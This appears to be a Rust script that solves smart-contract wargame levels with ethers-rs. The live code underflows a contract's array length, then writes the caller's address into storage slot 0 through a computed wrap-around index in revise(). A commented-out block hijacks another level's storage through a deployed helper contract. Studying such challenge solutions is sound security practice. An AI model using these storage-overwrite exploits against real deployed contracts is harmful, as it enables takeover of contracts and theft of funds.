use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function make_contact() public
        function retract() public
        function revise(uint, bytes32) public
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    /* let compiled = compile(Solc::new("./contracts/16_preservation/solution.sol")).await?;
    let solution_contract = compiled
        .get("Solution")
        .expect("could not find solution contract");
    let factory = ContractFactory::new(
        solution_contract.abi.clone(),
        solution_contract.bytecode.clone(),
        client.clone(),
    );
    println!("Deploying solution contract");
    let solution_contract = factory.deploy(())?.legacy().send().await?;
    let solution_address = solution_contract.address();
    println!("Solution contract deployed at {}\n", solution_address);

    let level_contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());
    let mut receipt = level_contract
        .set_first_time(utils::address_to_uint256(solution_address))
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "1st setFirstTime():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    receipt = level_contract
        .set_first_time(utils::address_to_uint256(client.default_sender().unwrap()))
        .legacy()
        .gas(1000000)
        .send()
        .await?
        .await?;
    println!(
        "2nd setFirstTime():\n{}",
        serde_json::to_string_pretty(&receipt)?
    ); */

    let level_contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());
    let mut receipt = level_contract.make_contact().legacy().send().await?.await?;
    println!(
        "make_contact():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    receipt = level_contract.retract().legacy().send().await?.await?;
    println!("retract():\n{}", serde_json::to_string_pretty(&receipt)?);

    let (i, _) = U256::zero().overflowing_sub(U256::from(ethers::utils::keccak256(
        H256::from_low_u64_be(1).as_bytes(),
    )));
    let address = utils::address_to_uint256(client.default_sender().unwrap()).into();
    println!("i: {:?}", i);
    receipt = level_contract
        .revise(i, address)
        .legacy()
        .send()
        .await?
        .await?;
    println!("revise():\n{}", serde_json::to_string_pretty(&receipt)?);
    Ok(())
}
